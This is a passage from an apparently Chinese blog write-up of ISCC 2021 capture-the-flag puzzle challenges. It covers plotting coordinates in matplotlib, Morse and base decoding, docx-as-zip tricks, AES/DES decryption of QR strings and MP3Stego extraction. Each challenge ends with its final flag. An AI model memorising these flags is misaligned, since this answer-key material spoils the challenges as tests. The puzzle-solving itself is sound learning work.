class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">12</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>百度找到的脚本，修改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br><br>fig = plt.figure()<br>ax = fig.gca(projection=<span class="hljs-string">&quot;3d&quot;</span>)<br><br><br>xs, ys ,zs= np.loadtxt(<span class="hljs-string">&#x27;xyz.txt&#x27;</span>, delimiter=<span class="hljs-string">&#x27;:&#x27;</span>, unpack=<span class="hljs-literal">True</span>)<br>ax.scatter(xs, ys, zs, zdir=<span class="hljs-string">&quot;z&quot;</span>, c=<span class="hljs-string">&quot;#FF5511&quot;</span>, marker=<span class="hljs-string">&quot;o&quot;</span>, s=<span class="hljs-number">40</span>)<br>ax.<span class="hljs-built_in">set</span>(xlabel=<span class="hljs-string">&quot;X&quot;</span>, ylabel=<span class="hljs-string">&quot;Y&quot;</span>, zlabel=<span class="hljs-string">&quot;Z&quot;</span>)<br><br>plt.show()<br></code></pre></td></tr></table></figure><p>得到<br><img src="https://img-blog.csdnimg.cn/20210519181216709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>脚本2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> mpl_toolkits.mplot3d <span class="hljs-keyword">import</span> Axes3D<br>dot1 = [[<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">2</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">1.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">6</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">5</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">7.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">8</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">9.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">10</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># 得到五个点</span><br>plt.figure()  <span class="hljs-comment"># 得到画面</span><br>ax1 = plt.axes(projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax1.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># X轴，横向向右方向</span><br>ax1.set_ylim(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># Y轴,左向与X,Z轴互为垂直</span><br>ax1.set_zlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># 竖向为Z轴</span><br>color1 = [<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>]<br>marker1 = [<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> dot1:<br>    ax1.scatter(x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], c=color1[<span class="hljs-number">1</span>],<br>                marker=marker1[<span class="hljs-number">1</span>], linewidths=<span class="hljs-number">4</span>)  <span class="hljs-comment"># 用散点函数画点</span><br>    i += <span class="hljs-number">1</span><br>plt.show()<br><br></code></pre></td></tr></table></figure><p>运行得到<br><img src="https://img-blog.csdnimg.cn/20210518192536935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>密码口令是<code>365728</code>，解压压缩包，得到pdf文档<br><img src="https://img-blog.csdnimg.cn/2021050114193340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONGRATULATIONTHEFLAGICHALLENGEISCCTWOZEROTWOONE<br></code></pre></td></tr></table></figure><p>根据提示最终flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ISCC&#123;congratulationtheflagischallengeiscctwozerotwoone&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-1"><a href="#海市蜃楼-1" class="headerlink" title="海市蜃楼-1"></a>海市蜃楼-1</h3><blockquote><p>题目描述： 或许你看到的只是海市蜃楼…</p></blockquote><p>下载附件，是个docx文档，看到了压缩包文件头PK<br><img src="https://img-blog.csdnimg.cn/20210501112349328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改后缀为zip，解压，在document.xml文件中找到flag<br><img src="https://img-blog.csdnimg.cn/20210501112248789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>方法二：<br>使用winrar在文件中搜索ISCC字符串<br><img src="https://img-blog.csdnimg.cn/20210506222625824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h3><p>参考：<a href="https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/">https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">pragma solidity ^0.7.0;  // 指定所需的编译器版本<br>//SPDX-License-Identifier: UNLICENSED<br><br>contract look_look &#123;<br>    <span class="hljs-keyword">function</span> sloc111() public pure returns (string memory)&#123;    //public智能合约外部和内部都可使用的方法<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br>合约地址: 0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5<br></code></pre></td></tr></table></figure><p>需要挂代理，访问<a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a></p><p>第一次做智能合约方面的题，输入合约地址，然后点击Contract<br><img src="https://img-blog.csdnimg.cn/2021050620485295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Decompile ByteCode，到这就卡住了<br><img src="https://img-blog.csdnimg.cn/20210506205053606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>星期天打了个比赛，里面也有个区块链题-<a href="https://www.anquanke.com/post/id/242237#h3-4">AZ</a>。公链明文泄露<br><img src="https://img-blog.csdnimg.cn/20210526141613891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>选择UTF-8 查看,得到flag<br><img src="https://img-blog.csdnimg.cn/20210526141638578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="美人计"><a href="#美人计" class="headerlink" title="美人计"></a>美人计</h3><blockquote><p>题目描述：美人说的话里有解题提示，但是美人的话不能全信。</p></blockquote><p>我记得当时附件文档中有两个二维码，二维码内容还保存着，图片不见了，不知道怎么回事</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">第一个二维码：<br>U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu<br><span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu<br>+CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE<br>+pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br><br>第二个二维码：<br>U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure><p>图片属性给的提示，AES加密，密钥是ISCC2021</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">Try</span> AES, <span class="hljs-keyword">and</span> you will get the flag. ISCC2021<br></code></pre></td></tr></table></figure><p>对第一个二维码内容，解了三次AES加密得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!<br></code></pre></td></tr></table></figure><p>第二个二维码内容，进行AES解密发现不行，然后尝试DES解密结果成功了，得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ISCC&#123;be@uty_1ike<span class="hljs-variable">$_Y0u_2O2lISCC</span>&#125;<br></code></pre></td></tr></table></figure><p>再复现的时候，附件中就剩一张二维码了，把docx后缀转换成zip解压，出题人变狗了，把第二张二维码藏在这了，和上面的方法一样，得到flag<br><img src="https://img-blog.csdnimg.cn/2021051320345497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="我的折扣是多少"><a href="#我的折扣是多少" class="headerlink" title="我的折扣是多少"></a>我的折扣是多少</h3><blockquote><p>题目描述：<br>小c同学去参加音乐会，在官网买票时发现了有提示消息，提供给的有“give_me_discount”的压缩包，好奇的小c下载下来，但却无从下手，为了节省零花钱，你能帮帮他吗？</p></blockquote><p>命令行运行give.exe，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass1&#123;\u006b\u0072\u0077&#125;<br></code></pre></td></tr></table></figure><p>把中间的进行unicode转码得到：pass1{krw}</p><p>010打开me.zip，在末尾发现Base编码<br><img src="https://img-blog.csdnimg.cn/20210501162644856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到：pass2{gcc666}</p><p>所以压缩包口令为krwgcc666，解压得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure><p>base64解码</p><p><img src="https://img-blog.csdnimg.cn/20210501163008756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>最后使用MP3Stego</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P youfoundme? discount.mp3<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501163051980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base32解码，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;Yourdiscount2.15&#125;<br></code></pre></td></tr></table></figure><h3 id="海市蜃楼-2"><a href="#海市蜃楼-2" class="headerlink" title="海市蜃楼-2"></a>海市蜃楼-2</h3><p>foremost分离图片，得到加密的压缩包</p><p>由于这是组合题，所以要在海市蜃楼-1中去找线索。最终发现true.xml有猫腻，原来是jpg文件<br><img 